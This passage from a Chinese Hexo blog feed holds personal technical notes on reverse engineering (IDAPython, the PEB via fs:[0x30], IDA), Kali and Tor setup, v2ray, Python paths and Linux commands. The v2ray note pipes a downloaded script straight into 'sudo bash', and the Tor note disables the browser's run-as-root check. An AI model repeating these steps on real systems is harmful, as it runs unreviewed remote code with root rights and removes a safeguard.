class="built_in">print</span> <span class="string">&quot;[*] Set %d breakpoints.&quot;</span> % num_breakpoints</span><br></pre></td></tr></table></figure><h3 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h3><p>IDAPRO的python插件-IDAPython<br><a href="https://blog.csdn.net/ojshilu/article/details/12905405">https://blog.csdn.net/ojshilu/article/details/12905405</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> idapython </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Memory Forensics Cheat Sheet</title>
      <link href="/2019/12/17/Windows-Memory-Forensics-Cheat-Sheet/"/>
      <url>/2019/12/17/Windows-Memory-Forensics-Cheat-Sheet/</url>
      
        <content type="html"><![CDATA[<p><strong>来自-<br>“<a href="http://cybersecqa.blogspot.com/2018/03/windows-memory-forensics-cheat-sheet.html%E2%80%9D">http://cybersecqa.blogspot.com/2018/03/windows-memory-forensics-cheat-sheet.html”</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> virus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac中python的安装目录</title>
      <link href="/2019/12/17/mac%E4%B8%ADpython%E7%9A%84%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95/"/>
      <url>/2019/12/17/mac%E4%B8%ADpython%E7%9A%84%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="1、python3-7的安装目录"><a href="#1、python3-7的安装目录" class="headerlink" title="1、python3.7的安装目录"></a>1、python3.7的安装目录</h3><p>被安装在“usr&#x2F;local&#x2F;Cellar”目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/Cellar/python/3.7.3/Frameworks/Python.framework/Versions/3.7</span><br></pre></td></tr></table></figure><p>相应的，其pip等插件被安装在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/Cellar/python/3.7.3/Frameworks/Python.framework/Versions/3.7/bin/pip</span><br><span class="line">/usr/local/Cellar/python/3.7.3/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pip</span><br></pre></td></tr></table></figure><p>同被安装在Cellar目录下的应用还有：yara、ruby、tree、ldid、等<br><img src="python3_module.png" width="90%" height="90%"></p><h3 id="2、python2-7的安装目录"><a href="#2、python2-7的安装目录" class="headerlink" title="2、python2.7的安装目录"></a>2、python2.7的安装目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/System/Library/Frameworks/Python.framework/Versions/2.7</span><br></pre></td></tr></table></figure><p>但pip工具被安装在了目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/Library/Python/2.7/lib/python/site-packages/pip</span><br></pre></td></tr></table></figure><p>同被安装在该“site-packages”目录下的有很多第三方模块，如“pefile.py”、”magic.py”、“pyspider”、“scrapy”、“pyecharts”等<br>另其他一些第三方库，如“bs4”、“requests”等被安装在如下路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Library/Python/2.7/site-packages</span><br></pre></td></tr></table></figure><img src="python27_module.png" width="90%" height="90%">]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Swift语音学习路径</title>
      <link href="/2019/12/16/Swift%E8%AF%AD%E9%9F%B3%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/"/>
      <url>/2019/12/16/Swift%E8%AF%AD%E9%9F%B3%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/49328078">https://www.zhihu.com/question/49328078</a><br><a href="https://juejin.im/post/5bd6af7451882526254942d5#heading-3">https://juejin.im/post/5bd6af7451882526254942d5#heading-3</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Swift </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编指令含义</title>
      <link href="/2019/12/11/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%90%AB%E4%B9%89/"/>
      <url>/2019/12/11/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%90%AB%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<p>CMP OPR1，OPR2<br>OPR1OPR2运算，影响PF和ZF(OPR1&#x3D;OPR2，ZF&#x3D;1，PF&#x3D;1;!&#x3D;,ZF&#x3D;0,PF&#x3D;0)</p><p>LEA OPR1，OPR2<br>将OPR2的地址赋给OPR1</p><p>AND OPR1，OPR2<br>OPR1，OPR2与运算为0时，ZF标志位为1；与运算为1是，ZF为0。</p><p>IMUL OPR1，OPR2，OPR3<br>将OPR2*OPR3赋给OPR1。</p><p>jge opr1,opr2两数比较，前者大于等于后者则跳。jump if greater or eaual.</p><p>rep stos dword ptr es:[edi]rep重复操作前缀 stos从累加器EAX传送4个字节，到由EDI作为指针的目的串中，同时修改EDI以指向 串中的下一个单元。利用重复操作可以在串在建立一串相同的值。此指令对标志位无影响。</p><p>rep 为repeat 重复之意<br>stos 为sotre string 保存字符串之意<br>ptr 为pointer 指针之意</p><p>在一个函数中，它所申请的栈存放局部变量，在执行函数体运算的时候，将局部变量赋给寄存器（如eax），eax参加运算。结果保留在栈中</p><p>ebp-8处存放 int i；<br>i+1；</p><p>00411577 8b45f8          mov     eax,dword ptr [ebp-8]<br>0041157a 83c001          add     eax,1<br>0041157d 8945f8          mov     dword ptr [ebp-8],eax</p>]]></content>
      
      
      <categories>
          
          <category> asm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PEB地址的取得</title>
      <link href="/2019/12/11/PEB%E5%9C%B0%E5%9D%80%E7%9A%84%E5%8F%96%E5%BE%97/"/>
      <url>/2019/12/11/PEB%E5%9C%B0%E5%9D%80%E7%9A%84%E5%8F%96%E5%BE%97/</url>
      
        <content type="html"><![CDATA[<h3 id="PEB地址的取得"><a href="#PEB地址的取得" class="headerlink" title="PEB地址的取得"></a>PEB地址的取得</h3><ul><li>原理：FS段寄存器指向当前的TEB结构，在TEB偏移0x30处是PEB指针，通过这个指针即可取得PEB的地址。</li><li>实现方法：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">  mov eax,fs:[<span class="number">0x30</span>]</span><br><span class="line">  mov PEB,eax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> asm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> peb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA中堆栈不平衡</title>
      <link href="/2019/12/11/IDA%E4%B8%AD%E5%A0%86%E6%A0%88%E4%B8%8D%E5%B9%B3%E8%A1%A1/"/>
      <url>/2019/12/11/IDA%E4%B8%AD%E5%A0%86%E6%A0%88%E4%B8%8D%E5%B9%B3%E8%A1%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="F5堆栈不平衡，修改堆栈"><a href="#F5堆栈不平衡，修改堆栈" class="headerlink" title="F5堆栈不平衡，修改堆栈"></a>F5堆栈不平衡，修改堆栈</h3><!--![修改堆栈](ida.jpg) --><img src="ida.jpg" width="90%" height="90%">]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo文章中插入图片</title>
      <link href="/2019/12/11/hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
      <url>/2019/12/11/hexo%E6%96%87%E7%AB%A0%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h3 id="1、修改hexo的-config-yml文件"><a href="#1、修改hexo的-config-yml文件" class="headerlink" title="1、修改hexo的_config.yml文件"></a>1、修改hexo的_config.yml文件</h3><p>将_config.yml文件中的配置项post_asset_folder设为true后，执行命令$ hexo new post_name，在source&#x2F;_posts中会生成文章post_name.md和同名文件夹post_name。将图片资源放在post_name中，文章就可以使用相对路径引用图片资源了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="2、测试"><a href="#2、测试" class="headerlink" title="2、测试"></a>2、测试</h3><!--哈哈我是多段注释，不会在浏览器中显示。下面是markdown插入图片的语法，但是好像不支持定义图片大小：![测试图片](222.jpg)所以用下面的html格式插入图片了--><img src="222.jpg" width="50%" height="50%"><h3 id="3、图片在首页中正常显示"><a href="#3、图片在首页中正常显示" class="headerlink" title="3、图片在首页中正常显示"></a>3、图片在首页中正常显示</h3><p>上述是 Markdown 的引用方式，图片只能在文章中显示，但无法在首页中正常显示。<br>因为目标文档中使用的是相对路径，在首页中同样是相对路径，首页中就找不到图片的实际位置，最终不能显示。所以有人写了一款插件：hexo-asset-image，这款插件可以自动将图片地址替换为绝对路径。<br>安装方法也很简单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>安装完成后，插件实际是存放在了下面的目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\blog\node_modules\hexo-asset-image</span><br></pre></td></tr></table></figure><p>想要卸载这个插件，直接删掉这个文件夹就可以了</p><h3 id="4、设置图片大小"><a href="#4、设置图片大小" class="headerlink" title="4、设置图片大小"></a>4、设置图片大小</h3><p>下面是markdown插入图片的语法，但是好像不支持定义图片大小：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">测试图片</span>](<span class="link">ida.jpg</span>)</span><br></pre></td></tr></table></figure><p>所以用下面的html格式插入图片了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;ida.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;90%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;90%&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali 2019.4 vmware 设置共享目录</title>
      <link href="/2019/12/06/kali-2019-4-vmware-%E8%AE%BE%E7%BD%AE%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95/"/>
      <url>/2019/12/06/kali-2019-4-vmware-%E8%AE%BE%E7%BD%AE%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="1、添加共享目录"><a href="#1、添加共享目录" class="headerlink" title="1、添加共享目录"></a>1、添加共享目录</h3><p>在mac上vmware给kali虚拟机添加共享目录</p><h3 id="2、映射到共享目录"><a href="#2、映射到共享目录" class="headerlink" title="2、映射到共享目录"></a>2、映射到共享目录</h3><h4 id="2-1、查看共享目录"><a href="#2-1、查看共享目录" class="headerlink" title="2.1、查看共享目录"></a>2.1、查看共享目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># vmware-hgfsclient</span></span><br></pre></td></tr></table></figure><h4 id="2-2、新建目录"><a href="#2-2、新建目录" class="headerlink" title="2.2、新建目录"></a>2.2、新建目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># mkdir /mnt/hgfs</span></span><br></pre></td></tr></table></figure><h4 id="2-3、创建映射"><a href="#2-3、创建映射" class="headerlink" title="2.3、创建映射"></a>2.3、创建映射</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other</span><br></pre></td></tr></table></figure><h4 id="2-4、设置，使每次开机启动，自动挂载共享文件夹"><a href="#2-4、设置，使每次开机启动，自动挂载共享文件夹" class="headerlink" title="2.4、设置，使每次开机启动，自动挂载共享文件夹"></a>2.4、设置，使每次开机启动，自动挂载共享文件夹</h4><p>需要在&#x2F;etc&#x2F;fstab的末尾添加多一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.host:/Downloads /mnt/hgfs/Downloads fuse.vmhgfs-fuse allow_other 0 0</span><br></pre></td></tr></table></figure><h3 id="3、设置软连接"><a href="#3、设置软连接" class="headerlink" title="3、设置软连接"></a>3、设置软连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /mnt/hgfs/Downloads/ ~/HostShare</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> vmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali 2019.4 配置tor浏览器</title>
      <link href="/2019/12/06/kali-2019-4-%E9%85%8D%E7%BD%AEtor%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
      <url>/2019/12/06/kali-2019-4-%E9%85%8D%E7%BD%AEtor%E6%B5%8F%E8%A7%88%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="1、下载tor浏览器"><a href="#1、下载tor浏览器" class="headerlink" title="1、下载tor浏览器"></a>1、下载tor浏览器</h3><pre><code>https://www.torproject.org/download/</code></pre><h3 id="2、解压并注册为桌面app"><a href="#2、解压并注册为桌面app" class="headerlink" title="2、解压并注册为桌面app"></a>2、解压并注册为桌面app</h3><h4 id="2-1、解压"><a href="#2-1、解压" class="headerlink" title="2.1、解压"></a>2.1、解压</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/opt<span class="comment"># tar -xvJf tor-browser-linux64-9.0.2_en-US.tar.xz</span></span><br></pre></td></tr></table></figure><h4 id="2-2、注释掉限制root用户启动的命令"><a href="#2-2、注释掉限制root用户启动的命令" class="headerlink" title="2.2、注释掉限制root用户启动的命令"></a>2.2、注释掉限制root用户启动的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/opt/tor-browser_en-US/Browser<span class="comment"># vim start-tor-browser</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;`id -u`&quot;</span> -eq 0 ; <span class="keyword">then</span></span><br><span class="line">complain <span class="string">&quot;The Tor Browser Bundle should not be run as root. Exiting.&quot;</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h4 id="2-3、注册为桌面app"><a href="#2-3、注册为桌面app" class="headerlink" title="2.3、注册为桌面app"></a>2.3、注册为桌面app</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/opt/tor-browser_en-US<span class="comment">#./start-tor-browser.desktop --register-app</span></span><br></pre></td></tr></table></figure><h3 id="3、启动tor并配置proxy"><a href="#3、启动tor并配置proxy" class="headerlink" title="3、启动tor并配置proxy"></a>3、启动tor并配置proxy</h3>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> tor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python终端输出打印彩色字体</title>
      <link href="/2019/12/05/python%E7%BB%88%E7%AB%AF%E8%BE%93%E5%87%BA%E6%89%93%E5%8D%B0%E5%BD%A9%E8%89%B2%E5%AD%97%E4%BD%93/"/>
      <url>/2019/12/05/python%E7%BB%88%E7%AB%AF%E8%BE%93%E5%87%BA%E6%89%93%E5%8D%B0%E5%BD%A9%E8%89%B2%E5%AD%97%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<h3 id="1、如下命令"><a href="#1、如下命令" class="headerlink" title="1、如下命令"></a>1、如下命令</h3><p>其中pargs是一个list，其实%后面的括号中为要输出的字符串即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\033[0;32m%s\033[0m&quot;</span>) % (<span class="string">&quot;vm cmd: &quot;</span> + <span class="string">&quot; &quot;</span>.<span class="built_in">join</span>(cmd <span class="keyword">for</span> cmd <span class="keyword">in</span> pargs))</span><br></pre></td></tr></table></figure><h3 id="2、-参考"><a href="#2、-参考" class="headerlink" title="2、 参考"></a>2、 参考</h3><p>Python终端输出打印彩色字体的方法<br><a href="https://www.cnblogs.com/huchong/p/7516712.html">https://www.cnblogs.com/huchong/p/7516712.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>技术博客</title>
      <link href="/2019/12/04/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/12/04/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h3 id="1、二进制漏洞"><a href="#1、二进制漏洞" class="headerlink" title="1、二进制漏洞"></a>1、二进制漏洞</h3><ul><li>Protostar</li></ul><ol><li><a href="http://3xp10it.cc/my-categories/">http://3xp10it.cc/my-categories/</a></li><li><a href="https://old.liveoverflow.com/binary_hacking/protostar/index.html">https://old.liveoverflow.com/binary_hacking/protostar/index.html</a></li></ol><h3 id="2、Android操作系统源码分析"><a href="#2、Android操作系统源码分析" class="headerlink" title="2、Android操作系统源码分析"></a>2、Android操作系统源码分析</h3><p>gityuan</p><ul><li><a href="http://gityuan.com/2015/10/31/binder-prepare/">http://gityuan.com/2015/10/31/binder-prepare/</a></li><li>如何自学Android?<br><a href="https://zhuanlan.zhihu.com/p/20708611">https://zhuanlan.zhihu.com/p/20708611</a></li><li>Android源码的Binder权限是如何控制？<br><a href="https://www.zhihu.com/question/41003297/answer/89328987?from=profile_answer_card">https://www.zhihu.com/question/41003297/answer/89328987?from=profile_answer_card</a></li><li>彻底理解 Android Binder 通信架构<br><a href="https://www.diycode.cc/topics/384android">https://www.diycode.cc/topics/384android</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali 2019.4 中文乱码</title>
      <link href="/2019/12/03/kali-2019-4-%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/"/>
      <url>/2019/12/03/kali-2019-4-%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="1、添加源"><a href="#1、添加源" class="headerlink" title="1、添加源"></a>1、添加源</h2><ul><li>编辑文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure></li><li>添加阿里云源<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#aliyun 阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></li></ul><h2 id="2、添加中文字体"><a href="#2、添加中文字体" class="headerlink" title="2、添加中文字体"></a>2、添加中文字体</h2><ul><li>更新<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure></li><li>添加中文字体<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ttf-wqy-microhei</span><br></pre></td></tr></table></figure></li></ul><h2 id="3、参考"><a href="#3、参考" class="headerlink" title="3、参考"></a>3、参考</h2><p><a href="https://www.xcnte.com/archives/732/">https://www.xcnte.com/archives/732/</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译ios工程</title>
      <link href="/2019/12/03/%E7%BC%96%E8%AF%91ios%E5%B7%A5%E7%A8%8B/"/>
      <url>/2019/12/03/%E7%BC%96%E8%AF%91ios%E5%B7%A5%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="1、pod"><a href="#1、pod" class="headerlink" title="1、pod"></a>1、pod</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pod install</span><br></pre></td></tr></table></figure><p>依赖于工程目录下的Podfile文件</p><ul><li>如果出现问题：<br>[!] Unable to determine Swift version for the following pods:<br><code>RealmSwift</code> is integrated by multiple targets that use a different Swift version: <code>Potatso</code> (Swift 4.0), <code>TodayWidget</code> (Swift 5.0),<br>解决方法：<br>you can set the Swift version by including e.g. ENV[‘SWIFT_VERSION’] &#x3D; ‘3’ at the top of your Podfile.</li></ul><h2 id="2、carthage"><a href="#2、carthage" class="headerlink" title="2、carthage"></a>2、carthage</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">carthage update --no-use-binaries --platform ios</span><br></pre></td></tr></table></figure><p>依赖于工程目录下的Cartfile文件</p><h2 id="3、参考"><a href="#3、参考" class="headerlink" title="3、参考"></a>3、参考</h2><p><a href="https://www.jianshu.com/p/44e73dca395d">https://www.jianshu.com/p/44e73dca395d</a></p>]]></content>
      
      
      <categories>
          
          <category> ios </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux安装v2ray</title>
      <link href="/2019/12/03/linux%E5%AE%89%E8%A3%85v2ray/"/>
      <url>/2019/12/03/linux%E5%AE%89%E8%A3%85v2ray/</url>
      
        <content type="html"><![CDATA[<h2 id="1、下载并安装v2ray"><a href="#1、下载并安装v2ray" class="headerlink" title="1、下载并安装v2ray"></a>1、下载并安装v2ray</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -Ls https://install.direct/go.sh | sudo bash</span><br></pre></td></tr></table></figure><h2 id="2、编辑配置文件"><a href="#2、编辑配置文件" class="headerlink" title="2、编辑配置文件"></a>2、编辑配置文件</h2><p>配置文件的位置为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/v2ray/config.json</span><br></pre></td></tr></table></figure><h2 id="3、启动v2ray服务"><a href="#3、启动v2ray服务" class="headerlink" title="3、启动v2ray服务"></a>3、启动v2ray服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/v2ray/v2ray -config=/etc/v2ray/config.json</span><br></pre></td></tr></table></figure><h2 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h2><p><a href="https://www.v2ray.com/en/welcome/install.html">https://www.v2ray.com/en/welcome/install.html</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v2ray </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成长</title>
      <link href="/2019/12/03/%E6%88%90%E9%95%BF/"/>
      <url>/2019/12/03/%E6%88%90%E9%95%BF/</url>
      
        <content type="html"><![CDATA[<ul><li>楼下一个男人病得要死，那间壁的一家唱着留声机；对面是弄孩子。楼上有两人狂笑；还有打牌声。河中的船上有女人哭着她死去的母亲。 人类的悲欢并不相通，我只觉得他们吵闹。</li><li>一命二运三风水，四积阴德五读书。</li><li>“底层放弃教育，中产过度焦虑，上层不玩中国高考”。顶层操控规则，中层高节奏工作，而底层的穷人，将连被剥削的价值都不再会有。</li><li>营销而已，用焦虑骗中产，用发财骗底层，用移民骗高产，都是这么个思路。</li><li>在中国被人尊重的方式只有一种，那就是 “有钱”。多么单一，多么可悲，可又多么真实。</li><li>到了一定年龄， 必须扔掉几样东西： 没意义的酒局， 不爱你的人，虚情假义的朋友！</li><li>与其在意别人的背弃和不善，不如经营自己的尊严和美好。</li><li>有没有觉的自己当初借钱出去那一刻的动作像个小丑？从结果来看，这些人当初借钱就压根没打算还，否则干嘛不去找app，却来找私人？</li></ul>]]></content>
      
      
      <categories>
          
          <category> book </category>
          
      </categories>
      
      
        <tags>
            
            <tag> life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python语法记录</title>
      <link href="/2019/12/02/python%E8%AF%AD%E6%B3%95%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/12/02/python%E8%AF%AD%E6%B3%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="1、list打印"><a href="#1、list打印" class="headerlink" title="1、list打印"></a>1、list打印</h2><p>如下，pargs为类型list，打印其中的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&quot;pcap cmd: &quot;</span>+<span class="string">&quot; &quot;</span>.<span class="built_in">join</span>(cmd <span class="keyword">for</span> cmd <span class="keyword">in</span> pargs)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux命令记录</title>
      <link href="/2019/11/28/linux%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/11/28/linux%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="1、vim命令"><a href="#1、vim命令" class="headerlink" title="1、vim命令"></a>1、vim命令</h2><h3 id="1-1、复制粘贴"><a href="#1-1、复制粘贴" class="headerlink" title="1.1、复制粘贴"></a>1.1、复制粘贴</h3><ul><li>方法1<br>使用v进入可视模式<br>复制命令是y（yank提起）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">y10 //复制当前及紧跟的10行</span><br><span class="line">10y //复制第10行</span><br></pre></td></tr></table></figure></li><li>方法2（加j）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y10j //复制当前行和接下来的10行</span><br></pre></td></tr></table></figure>粘贴为p（put放下）</li></ul><h3 id="1-2、查看文件编码"><a href="#1-2、查看文件编码" class="headerlink" title="1.2、查看文件编码"></a>1.2、查看文件编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> fileencoding</span><br></pre></td></tr></table></figure><h2 id="2、字符串、文件查找"><a href="#2、字符串、文件查找" class="headerlink" title="2、字符串、文件查找"></a>2、字符串、文件查找</h2><ul><li>字符串查找<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name <span class="string">&quot;*.go&quot;</span> | xargs grep <span class="string">&quot;index.html&quot;</span></span><br></pre></td></tr></table></figure></li><li>文件查找<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home/username/Soft/ -name <span class="string">&#x27;gdbserver&#x27;</span></span><br></pre></td></tr></table></figure></li><li>定位命令<br>locate定位命令用来查找文件，如<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate 文件或者目录或部分名</span><br></pre></td></tr></table></figure></li></ul><h2 id="3、网络相关"><a href="#3、网络相关" class="headerlink" title="3、网络相关"></a>3、网络相关</h2><ul><li>重启网络<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># /etc/init.d/networking restart </span></span><br></pre></td></tr></table></figure></li><li>ssh登陆<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -t root@172.16.244.100 -p 20000</span><br></pre></td></tr></table></figure></li><li>修改ip信息</li></ul><ol><li><p>修改ip地址</p><p> 即时生效:</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 172.16.244.100  netmask 